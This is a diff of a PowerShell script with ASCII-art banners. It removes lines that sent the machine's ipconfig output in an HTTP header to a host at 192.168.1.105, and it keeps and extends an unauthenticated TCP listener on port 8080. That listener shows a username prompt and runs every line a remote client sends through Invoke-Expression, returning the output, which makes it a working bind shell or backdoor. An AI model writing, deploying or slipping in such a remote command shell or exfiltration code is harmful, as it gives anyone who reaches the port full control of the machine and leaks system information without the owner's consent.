@@ -1,25 +1,5 @@
-# Define the URL and headers
-$url = "http://192.168.1.105:5000"
-$headers = @{
-    'ip' = (ipconfig | Out-String)
-}
+Write-Host @"
 
-# Create a WebClient object
-$client = New-Object System.Net.WebClient
-
-# Set the headers
-foreach ($header in $headers.GetEnumerator()) {
-    $client.Headers.Add($header.Key, $header.Value)
-}
-
-# Send the request
-$response = $client.DownloadString($url)
-
-# Display the response
-Write-Host "Response from server:"
-Write-Host $response
-
-$asciiArt = @"
           _____                    _____                    _____                   _______                 
          /\    \                  /\    \                  /\    \                 /::\    \                
         /::\    \                /::\    \                /::\    \               /::::\    \               
@@ -37,18 +17,18 @@ $asciiArt = @"
    \::::/____/              \:::\   \:::\____\               \:::\____\        \:::\__/:::/    /            
     \:::\    \               \:::\  /:::/    /                \::/    /         \::::::::/    /             
      \:::\    \               \:::\/:::/    /                  \/____/           \::::::/    /              
-      \:::\    \               \::::::/    /                                      \::/____/                
-       \:::\____\               \::::/    /                                        \::/                      
-        \::/    /                \::/    /                                          \/                       
+      \:::\    \               \::::::/    /                                      \::::/    /               
+       \:::\____\               \::::/    /                                        \::/____/                
+        \::/    /                \::/    /                                          ~~                      
          \/____/                  \/____/                                                                   
-"@
+                                                                                                            
 
-# Display ASCII art on both client and host
-Write-Host $asciiArt
+"@
 
 # Set up TCP listener
 $listener = New-Object System.Net.Sockets.TcpListener ([System.Net.IPAddress]::Any, 8080)
 $listener.Start()
+$currentUsername = $env:USERNAME
 
 Write-Host "Listening for connections on port 8080..."
 
@@ -59,16 +39,47 @@ while ($true) {
         $stream = $client.GetStream()
         $reader = New-Object System.IO.StreamReader($stream)
         $writer = New-Object System.IO.StreamWriter($stream)
-        $writer.Write("PS > $asciiArt")
-        $writer.Flush()
+	$writer.Write("
+		
+          _____                    _____                    _____                   _______                 
+         /\    \                  /\    \                  /\    \                 /::\    \                
+        /::\    \                /::\    \                /::\    \               /::::\    \               
+        \:::\    \              /::::\    \              /::::\    \             /::::::\    \              
+         \:::\    \            /::::::\    \            /::::::\    \           /::::::::\    \             
+          \:::\    \          /:::/\:::\    \          /:::/\:::\    \         /:::/~~\:::\    \            
+           \:::\    \        /:::/__\:::\    \        /:::/__\:::\    \       /:::/    \:::\    \           
+           /::::\    \       \:::\   \:::\    \      /::::\   \:::\    \     /:::/    / \:::\    \          
+  ____    /::::::\    \    ___\:::\   \:::\    \    /::::::\   \:::\    \   /:::/____/   \:::\____\         
+ /\   \  /:::/\:::\    \  /\   \:::\   \:::\    \  /:::/\:::\   \:::\    \ |:::|    |     |:::|    |        
+/::\   \/:::/  \:::\____\/::\   \:::\   \:::\____\/:::/  \:::\   \:::\____\|:::|____|     |:::|    |        
+\:::\  /:::/    \::/    /\:::\   \:::\   \::/    /\::/    \:::\   \::/    / \:::\    \   /:::/    /         
+ \:::\/:::/    / \/____/  \:::\   \:::\   \/____/  \/____/ \:::\   \/____/   \:::\    \ /:::/    /          
+  \::::::/    /            \:::\   \:::\    \               \:::\    \        \:::\    /:::/    /           
+   \::::/____/              \:::\   \:::\____\               \:::\____\        \:::\__/:::/    /            
+    \:::\    \               \:::\  /:::/    /                \::/    /         \::::::::/    /             
+     \:::\    \               \:::\/:::/    /                  \/____/           \::::::/    /              
+      \:::\    \               \::::::/    /                                      \::::/    /               
+       \:::\____\               \::::/    /                                        \::/____/                
+        \::/    /                \::/    /                                          ~~                      
+         \/____/                  \/____/                                                                   
+                                                                                                            
 
+")
         while ($client.Connected) {
+            # Display a prompt
+	
+            $writer.Write("$currentUsername > ")
+            $writer.Flush()
+
             $data = $reader.ReadLine()
             if ($data -eq $null) {
                 break
             }
 
+            # Execute command and capture the output as a string
             $output = Invoke-Expression -Command $data | Out-String
+
+            # Echo back to the client
             $writer.WriteLine($output)
             $writer.Flush()
         }
